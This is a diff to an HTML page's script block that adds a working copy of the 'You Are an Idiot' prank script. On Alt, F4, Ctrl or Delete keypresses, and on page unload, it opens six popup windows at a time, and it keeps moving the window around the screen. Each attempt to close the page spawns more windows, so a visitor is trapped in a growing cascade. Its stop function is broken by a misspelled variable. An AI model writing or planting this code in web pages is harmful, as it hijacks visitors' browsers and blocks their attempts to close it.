@@ -8,7 +8,73 @@
     }
 </style>
 <script language=Javascript>
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
+function altf4key() { if (event.keyCode == 18 || event.keyCode == 115) procreate(); }
+function ctrlkey() { if (event.keyCode == 17) procreate(); }
+function delkey() { if (event.keyCode == 46) procreate(); }
+
+		var xOff = 5;
+		var yOff = 5;
+		var xPos = 400;
+		var yPos = -100;
+		var flagRun = 1;
+
+function openWindow(url){
+        aWindow = window.open(url,"_blank", 'menubar=no,status=no,toolbar=no,width=190,height=175,titlebar=no,location=no,alwaysRaised=yes,allow=autoplay');
+}
+
+function procreate(){
+		openWindow('idiot.html');
+		openWindow('idiot.html');
+		openWindow('idiot.html');
+		openWindow('idiot.html');
+		openWindow('idiot.html');
+		openWindow('idiot.html');
+		}
+
+function newXlt(){
+        xOff = Math.ceil( 0 - 6 * Math.random()) * 5 - 10 ;
+        window.focus()}
+
+function newXrt(){
+        xOff = Math.ceil(7 * Math.random())  * 5 - 10 ;
+        }
+
+function newYup(){
+        yOff = Math.ceil( 0 - 6 * Math.random())  * 5 - 10 ;
+        }
+
+function newYdn(){
+        yOff = Math.ceil( 7 * Math.random())  * 5 - 10  ;
+        }
+function fOff(){
+        flagrun = 0;
+        }
+
+function playBall(){
+        xPos += xOff;
+        yPos += yOff;
+        if (xPos > screen.width-175){
+        newXlt();
+        }
+        if (xPos < 0){
+        newXrt();
+        }
+        if (yPos > screen.height-100){
+        newYup();
+        }
+        if (yPos < 0){
+        newYdn();
+        }
+        if (flagRun == 1){
+        window.moveTo(xPos,yPos);
+        setTimeout('playBall()',1);
+        }
+        }
+window.addEventListener("unload", closingCode, false);
+function closingCode(){
+   procreate();
+   return null;
+}
 </script>
 </head>
 <body bgColor=#ffffff onload="flagRun=1;playBall();return true;bookmark();" onKeyDown="altf4key();ctrlkey();delkey();" onUnLoad="procreate()" onBeforeUnload="procreate()" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
